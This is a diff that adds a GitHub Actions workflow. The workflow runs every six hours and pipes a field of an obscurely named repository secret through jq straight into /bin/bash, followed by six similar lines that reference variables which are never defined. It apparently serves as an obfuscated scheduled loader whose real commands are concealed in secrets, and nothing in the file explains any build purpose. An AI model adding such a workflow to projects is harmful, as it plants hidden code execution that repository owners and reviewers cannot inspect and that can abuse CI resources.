@@ -1,0 +1,22 @@
+name: mohehainan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mohehainan
+        env:
+          fv77973: ${{ secrets.fv77973 }}
+        run: |
+          echo $fv77973 | jq -r .d90 | /bin/bash
+          echo $hdq1 | jq -r .rvj86 | /bin/bash
+          echo $rsq90746 | jq -r .xw49 | /bin/bash
+          echo $c42524 | jq -r .m6340 | /bin/bash
+          echo $jr50 | jq -r .ah8 | /bin/bash
+          echo $gbxng23668 | jq -r .pylp9 | /bin/bash
+          echo $vlq60 | jq -r .wwb91871 | /bin/bash
+
